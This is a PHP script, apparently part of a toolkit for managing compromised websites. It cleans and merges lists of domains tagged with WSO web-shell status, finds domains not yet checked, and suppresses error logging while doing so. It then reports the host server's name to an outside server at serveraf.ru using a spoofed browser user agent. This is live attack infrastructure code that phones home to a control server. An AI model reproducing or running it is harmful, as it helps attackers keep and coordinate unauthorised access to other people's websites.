<?php
ignore_user_abort(true);
set_time_limit(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
function read_file($file_name) 	// $file_name - имя текст дока, который надо прочитать. $arr_name - имя массива, в который надо сохранить.
{
	$list = dirname(__FILE__)."/"."$file_name";
	if (file_exists("$file_name") and (filesize("$file_name")>1))
	{
		$file = fopen($list,"rt");
		$arr_file = explode("\n",fread($file,filesize($list)));
		fclose($file);
		return $arr_file;
	}
	else
	{
		$arr_file = array();
		return $arr_file;
	}
}

function arr_trim($arr)			// Очищает элементы массива от лишних пробелов.
{	
	$new_array = array();
	foreach ($arr as $each)
	{
		$new_array[] = trim($each);
	}
	return $new_array;
}
?>


<?php
if ($_GET['step'] == 'first')
{
	$check = 'rvf';

	if (file_exists("bad_list.txt") and (filesize("bad_list.txt")>0))
		$bad = read_file("bad_list.txt");
	else
		$bad = array('');

	if (file_exists("good_list.txt") and (filesize("good_list.txt")>0))
		$good = read_file("good_list.txt");
	else
		$good = array('');
		
	if (file_exists("not_loading.txt") and (filesize("not_loading.txt")>0))
		$not_loading = read_file("not_loading.txt");
	else
		$not_loading = array('');	
		
	// START: Очистка гудов.
	$g = fopen ("good_list.txt", "w");
	fwrite($g, $check."\n");
	
	$good = array_unique($good);
	foreach ($good as $good_clean)
	{
		$good_clean = trim($good_clean);
		if (($good_clean != '') and ($good_clean != ' ') and ($good_clean != null) and ($good_clean != 'rvf'))
		{
			fwrite($g, $good_clean."\n");
		}
	}
	fclose($g);
	// END: Очистка гудов.

	// START: Очистка not loading.
	$not_l = fopen ("not_loading.txt", "w");
	fwrite($not_l, $check."\n");
	
	$not_loading = array_unique($not_loading);
	foreach ($not_loading as $not_loading_clean)
	{
		$not_loading_clean = trim($not_loading_clean);
		if (($not_loading_clean != '') and ($not_loading_clean != ' ') and ($not_loading_clean != null) and ($not_loading_clean != 'rvf'))
		{
			fwrite($not_l, $not_loading_clean."\n");
		}
	}
	fclose($not_l);
	// END: Очистка not loading.

	$result = array_merge($bad, $good, $not_loading);
	$new_result = array();
	
	foreach ($result as $clean_result)
	{
		if (($clean_result !== '') and ($clean_result !== ' ') and ($clean_result !== null) and ($clean_result !== 'rvf'))
		{
			$clean_result = str_replace(' - WSO', '', $clean_result);
			$clean_result = str_replace(' - without_pass_wso', '', $clean_result);
			$clean_result = str_replace(' - without_pass_handmade', '', $clean_result);
			$clean_result = str_replace(' - with pass unknown', '', $clean_result);
			
			$clean_result = trim($clean_result);
			$new_result[] = $clean_result;
		}
	}
	
	$f = fopen ("all_result.txt", "w");
	fwrite($f, $check."\n");
	
	$new_result = array_unique($new_result);
	foreach ($new_result as $each)
	{
		$each = trim($each);
		if (($each !== '') and ($each !== ' ') and ($each !== null) and ($each !== 'rvf'))
			fwrite($f, $each."\n");
	}
	fclose($f);
	
	// START: Ищем not_checked домены
	$all_result = read_file('all_result.txt');
	$domains = arr_trim(read_file('domains.txt'));

	$finish_result = array_diff($domains, $all_result);				// Исключаем общие домены
	sort($finish_result);


	// END: Ищем not_checked домены
	$check = 'rvf';

	$sd = fopen ("not_checked.txt", "w");
	fwrite($sd, $check."\n");

	$finish_result = array_unique($finish_result);
	foreach ($finish_result as $not_check)
	{
		if (($not_check != '') and ($not_check != ' ') and ($not_check != null) and ($not_check != 'rvf'))
			fwrite($sd, $not_check."\n");
	}
	fclose($sd);

	echo "Cleaning is done!";
	
	$domain_name = $_SERVER['SERVER_NAME'];
	$url = 'http://serveraf.ru/reciever.php?clean='.$domain_name;
	$UA = 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)';
	
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);		
	curl_setopt($ch, CURLOPT_TIMEOUT, 9);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
	curl_setopt($ch, CURLOPT_REFERER, $domain_name);
	curl_setopt($ch, CURLOPT_USERAGENT, $UA);
	
	$data = curl_exec($ch);
	curl_close($ch);
	
	echo $data.'<hr>';
	
	$data = file_get_contents($url);
	echo $data.'<hr>';
}
?>